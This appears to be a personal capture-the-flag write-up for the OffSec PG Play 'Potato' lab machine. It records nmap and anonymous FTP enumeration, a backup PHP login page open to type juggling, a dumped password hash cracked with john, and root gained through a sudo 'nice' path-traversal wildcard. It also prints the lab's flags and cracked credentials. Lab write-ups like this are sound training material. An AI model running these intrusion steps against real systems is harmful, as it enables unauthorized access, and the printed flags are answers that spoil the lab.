---
title: "Potato"
kind: writeup
tags:
  - offsec-pg-play
  - status/done
  - writeup
  - linux
  - web
status: "Done"
difficulty: "Easy"
date: 2026-06-24
category:
  - "Linux"
  - "Web"
database: "Offsec PG Play"
area: "Offsec PG Play"
up: "[[Offsec PG Play]]"
notion-id: 389759b9275180f4933ef6fc0e69bb35
---

# Potato

In: [[Career]] / [[Offsec PG Play]]

## Nmap Scan

```bash
┌──(kali㉿kali)-[~/Downloads]
└─$ nmap -p- -T4 -Pn -sC -sV --min-rate=1000 -oA ~/nmap/nmap_full_scan 192.168.210.101
Starting Nmap 7.99 ( https://nmap.org ) at 2026-06-24 00:07 -0400
Stats: 0:00:04 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
Nmap scan report for 192.168.210.101
Host is up (0.075s latency).
Not shown: 65532 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 ef:24:0e:ab:d2:b3:16:b4:4b:2e:27:c0:5f:48:79:8b (RSA)
|   256 f2:d8:35:3f:49:59:85:85:07:e6:a2:0e:65:7a:8c:4b (ECDSA)
|_  256 0b:23:89:c3:c0:26:d5:64:5e:93:b7:ba:f5:14:7f:3e (ED25519)
80/tcp   open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Potato company
|_http-server-header: Apache/2.4.41 (Ubuntu)
2112/tcp open  ftp     ProFTPD
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| -rw-r--r--   1 ftp      ftp           901 Aug  2  2020 index.php.bak
|_-rw-r--r--   1 ftp      ftp            54 Aug  2  2020 welcome.msg
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 44.92 seconds

```

## Anonymous FTP Login

```bash
                                                                                                                                                                                                                                            
┌──(kali㉿kali)-[~/Downloads]
└─$ ftp 192.168.210.101 -p 2112
Connected to 192.168.210.101.
220 ProFTPD Server (Debian) [::ffff:192.168.210.101]
Name (192.168.210.101:kali): anonymous
331 Anonymous login ok, send your complete email address as your password
Password: 
230-Welcome, archive user anonymous@192.168.45.195 !
230-
230-The local time is: Wed Jun 24 04:08:57 2026
230-
230 Anonymous access granted, restrictions apply
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||37209|)
150 Opening ASCII mode data connection for file list
-rw-r--r--   1 ftp      ftp           901 Aug  2  2020 index.php.bak
-rw-r--r--   1 ftp      ftp            54 Aug  2  2020 welcome.msg
226 Transfer complete
ftp> mget *
mget welcome.msg [anpqy?]? 
229 Entering Extended Passive Mode (|||59287|)
150 Opening BINARY mode data connection for welcome.msg (54 bytes)
    54      976.56 KiB/s 
226 Transfer complete
54 bytes received in 00:00 (0.74 KiB/s)
mget index.php.bak [anpqy?]? 
229 Entering Extended Passive Mode (|||25996|)
150 Opening BINARY mode data connection for index.php.bak (901 bytes)
   901        8.10 MiB/s 
226 Transfer complete
901 bytes received in 00:00 (12.45 KiB/s)
ftp> exit
221 Goodbye.

```

## FTP Files

```bash
┌──(kali㉿kali)-[~/Downloads]
└─$ ls
index.php.bak  universal.ovpn  welcome.msg
                                                                                                                                                                                                                                            
┌──(kali㉿kali)-[~/Downloads]
└─$ cat index.php.bak                                                                                                      
<html>
<head></head>
<body>

<?php

$pass= "potato"; //note Change this password regularly

if($_GET['login']==="1"){
  if (strcmp($_POST['username'], "admin") == 0  && strcmp($_POST['password'], $pass) == 0) {
    echo "Welcome! </br> Go to the <a href=\"dashboard.php\">dashboard</a>";
    setcookie('pass', $pass, time() + 365*24*3600);
  }else{
    echo "<p>Bad login/password! </br> Return to the <a href=\"index.php\">login page</a> <p>";
  }
  exit();
}
?>

  <form action="index.php?login=1" method="POST">
                <h1>Login</h1>
                <label><b>User:</b></label>
                <input type="text" name="username" required>
                </br>
                <label><b>Password:</b></label>
                <input type="password" name="password" required>
                </br>
                <input type="submit" id='submit' value='Login' >
  </form>
</body>
</html>

                                                                                                                                                                                                                                            
┌──(kali㉿kali)-[~/Downloads]
└─$ cat welcome.msg  
Welcome, archive user %U@%R !

The local time is: %T

```

## Fuzzing Directories

```bash
┌──(kali㉿kali)-[~/Downloads]
└─$ ffuf  -u "http://192.168.210.101/FUZZ" -w /usr/share/wordlists/seclists/Discovery/Web-Content/big.txt -r     

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://192.168.210.101/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/Web-Content/big.txt
 :: Follow redirects : true
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

.htaccess               [Status: 403, Size: 280, Words: 20, Lines: 10, Duration: 1237ms]
.htpasswd               [Status: 403, Size: 280, Words: 20, Lines: 10, Duration: 3246ms]
admin                   [Status: 200, Size: 466, Words: 145, Lines: 20, Duration: 69ms]
server-status           [Status: 403, Size: 280, Words: 20, Lines: 10, Duration: 71ms]
:: Progress: [20481/20481] :: Job [1/1] :: 564 req/sec :: Duration: [0:00:39] :: Errors: 0 ::
                                                                                                                                                  
```

![[attachments/Offsec PG Play/Potato/image.png]]

```html
<html>
<head></head>
<body>

<?php

$pass= "potato"; //note Change this password regularly

if($_GET['login']==="1"){
  if (strcmp($_POST['username'], "admin") == 0  && strcmp($_POST['password'], $pass) == 0) {
    echo "Welcome! </br> Go to the <a href=\"dashboard.php\">dashboard</a>";
    setcookie('pass', $pass, time() + 365*24*3600);
  }else{
    echo "<p>Bad login/password! </br> Return to the <a href=\"index.php\">login page</a> <p>";
  }
  exit();
}
?>

  <form action="index.php?login=1" method="POST">
                <h1>Login</h1>
                <label><b>User:</b></label>
                <input type="text" name="username" required>
                </br>
                <label><b>Password:</b></label>
                <input type="password" name="password" required>
                </br>
                <input type="submit" id='submit' value='Login' >
  </form>
</body>
</html>

```

Tried various different passwords, fuzzed various passwords but of no use

The above code is vulnerable to “Login Bypass via Type Juggling”

![[attachments/Offsec PG Play/Potato/image 1.png]]

![[attachments/Offsec PG Play/Potato/image 2.png]]

![[attachments/Offsec PG Play/Potato/image 3.png]]

![[attachments/Offsec PG Play/Potato/image 4.png]]

![[attachments/Offsec PG Play/Potato/image 5.png]]

```bash
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
syslog:x:104:110::/home/syslog:/usr/sbin/nologin
_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin
tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin
landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:110:1::/var/cache/pollinate:/bin/false
sshd:x:111:65534::/run/sshd:/usr/sbin/nologin
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
florianges:x:1000:1000:florianges:/home/florianges:/bin/bash
lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
proftpd:x:112:65534::/run/proftpd:/usr/sbin/nologin
ftp:x:113:65534::/srv/ftp:/usr/sbin/nologin
webadmin:$1$webadmin$3sXBxGUtDGIFAcnNTNhi6/:1001:1001:webadmin,,,:/home/webadmin:/bin/bash
```

```bash
                                                                                                                                                                                                                                            
┌──(kali㉿kali)-[~/Downloads]
└─$ cat hash.txt
$1$webadmin$3sXBxGUtDGIFAcnNTNhi6/
                                                                                                                                                                                                                                            
┌──(kali㉿kali)-[~/Downloads]
└─$ john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
Warning: detected hash type "md5crypt", but the string is also recognized as "md5crypt-long"
Use the "--format=md5crypt-long" option to force loading these as that type instead
Using default input encoding: UTF-8
Loaded 1 password hash (md5crypt, crypt(3) $1$ (and variants) [MD5 128/128 AVX 4x3])
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
dragon           (?)     
1g 0:00:00:00 DONE (2026-06-24 00:37) 50.00g/s 19200p/s 19200c/s 19200C/s 123456..michael1
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
                       
```

## User Flag

```bash
┌──(kali㉿kali)-[~/Downloads]
└─$ ssh webadmin@192.168.210.101                      
The authenticity of host '192.168.210.101 (192.168.210.101)' can't be established.
ED25519 key fingerprint is: SHA256:9DQds4tRzLVKtayQC3VgIo53wDRYtKzwBRgF14XKjCg
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '192.168.210.101' (ED25519) to the list of known hosts.
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
webadmin@192.168.210.101's password: 
Welcome to Ubuntu 20.04 LTS (GNU/Linux 5.4.0-42-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Wed 24 Jun 2026 04:38:38 AM UTC

  System load:  0.0                Processes:               150
  Usage of /:   12.2% of 31.37GB   Users logged in:         0
  Memory usage: 24%                IPv4 address for ens192: 192.168.210.101
  Swap usage:   0%

118 updates can be installed immediately.
33 of these updates are security updates.
To see these additional updates run: apt list --upgradable

The list of available updates is more than a week old.
To check for new updates run: sudo apt update

The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

webadmin@serv:~$ ls /home
florianges  webadmin
webadmin@serv:~$ cd /home/webadmin/
webadmin@serv:~$ ls
local.txt  user.txt
webadmin@serv:~$ cat /home/webadmin/local.txt 
9a80e5035541dda54373c5fc661b3c13

```

## Root Flag

```bash
webadmin@serv:~$ sudo -l
Matching Defaults entries for webadmin on serv:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User webadmin may run the following commands on serv:
    (ALL : ALL) /bin/nice /notes/*

webadmin@serv:/notes$ sudo /bin/nice /notes/id.sh
uid=0(root) gid=0(root) groups=0(root)

webadmin@serv:/notes$ ls -la
total 16
drwxr-xr-x  2 root root 4096 Aug  2  2020 .
drwxr-xr-x 21 root root 4096 Sep 28  2020 ..
-rwx------  1 root root   11 Aug  2  2020 clear.sh
-rwx------  1 root root    8 Aug  2  2020 id.sh

webadmin@serv:/notes$ cd /home

webadmin@serv:/home$ ls
florianges  webadmin

webadmin@serv:/home$ cd webadmin/

webadmin@serv:~$ echo "/bin/bash -i"
/bin/bash -i

webadmin@serv:~$ echo "/bin/bash -i" > root.sh

webadmin@serv:~$ sudo /bin/nice /notes/../../../../home/webadmin/root.sh
/bin/nice: ‘/notes/../../../../home/webadmin/root.sh’: Permission denied

webadmin@serv:~$ sudo /bin/nice /notes/../home/webadmin/root.sh
/bin/nice: ‘/notes/../home/webadmin/root.sh’: Permission denied

webadmin@serv:~$ chmod +x root.sh 

webadmin@serv:~$ sudo /bin/nice /notes/../home/webadmin/root.sh

root@serv:/home/webadmin# whoami
root

root@serv:/home/webadmin# cat /root/proof.txt
92225bf8539c4ec40515bc41165ab6ad
```
